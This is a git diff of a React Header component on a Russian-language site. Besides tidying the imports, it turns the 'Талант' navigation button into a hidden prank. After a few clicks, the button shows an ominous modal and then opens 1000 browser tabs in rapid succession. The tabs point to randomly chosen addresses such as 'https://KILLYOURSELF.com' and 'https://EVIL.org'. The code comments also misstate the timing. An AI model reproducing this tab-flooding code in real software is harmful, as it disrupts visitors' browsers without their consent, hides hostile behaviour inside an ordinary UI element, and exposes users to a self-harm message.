@@ -1,20 +1,54 @@
-import {
-	AppBar,
-	Box,
-	Button,
-	Grid,
-	Toolbar,
-	Typography
-} from "@mui/material";
-import React, {useLayoutEffect, useState } from 'react';
-import { NavigateFunction, useNavigate } from 'react-router-dom';
+import {AppBar, Box, Button, Grid, Toolbar, Typography} from "@mui/material";
+import React, {useLayoutEffect, useState} from 'react';
+import {NavigateFunction, useNavigate} from 'react-router-dom';
 import pixerellImage from "../../workingImages/pixerell.png"
+import ModalTalant from "../helpers/modal-component/ModalTalant";
 import './Header.scss';
 
 export default function Header(): JSX.Element {
 
 	const navigate: NavigateFunction = useNavigate();
 	const [animationPlayed, setAnimationPlayed] = useState(false);
+
+	const [isOpen, setIsOpen] = useState(false);
+
+	const [clickCount, setClickCount] = useState(0);
+	const [modalText, setModalText] = useState("Эта страница содержит неописуемые преступления против человечества, развернись пока можешь.");
+
+	const handleClick: () => void = () => {
+		setClickCount(clickCount + 1);
+
+		if (clickCount === 1) {
+			setModalText("It's over...")
+			setIsOpen(true)
+		}
+		else if (clickCount === 2) {
+			for (let i:number = 0; i < 1000; i++) {
+				setTimeout(() => {
+					const randomUrl:string = generateRandomUrl();
+					window.open(randomUrl, '_blank');
+				}, i * 100); // Delay each redirect by 1 second
+			}
+
+			setTimeout(() => {
+				navigate('/talant')
+				setIsOpen(false)
+			}, 1000); // Delay the navigation by 5 seconds (adjust as needed)
+		}
+
+		else {
+			setIsOpen(true)
+		}
+
+	}
+
+
+	const generateRandomUrl: () => string = () => {
+		const urls: string[] = ['https://KILLYOURSELF.com', 'https://EVIL.org', 'https://THEENDISNIGH.net'];
+		const randomIndex: number = Math.floor(Math.random() * urls.length);
+		return urls[randomIndex];
+	};
+
 
 	useLayoutEffect(() => {
 		const isAnimationPlayed: boolean = localStorage.getItem('animationPlayed') === 'true';
@@ -31,6 +65,7 @@ export default function Header(): JSX.Element {
 			setAnimationPlayed(false);
 		});
 	}, []);
+
 
 	return (
 		<Box sx={{ flexGrow: 1 }} className={'Header'}>
@@ -59,9 +94,12 @@ export default function Header(): JSX.Element {
 									className={'Typography'}>Графики</Typography></Button>
 							</Grid>
 							<Grid>
-								<Button onClick={() => navigate('/talant')} className={'Button'}
+								<Button onClick={handleClick} className={'Button'}
 										variant="text"><Typography
 									className={'Typography'}>Талант</Typography></Button>
+								<ModalTalant open={isOpen} onClose={() => setIsOpen(false)}>
+									{modalText}
+								</ModalTalant>
 							</Grid>
 						</Grid>
 					</Box>
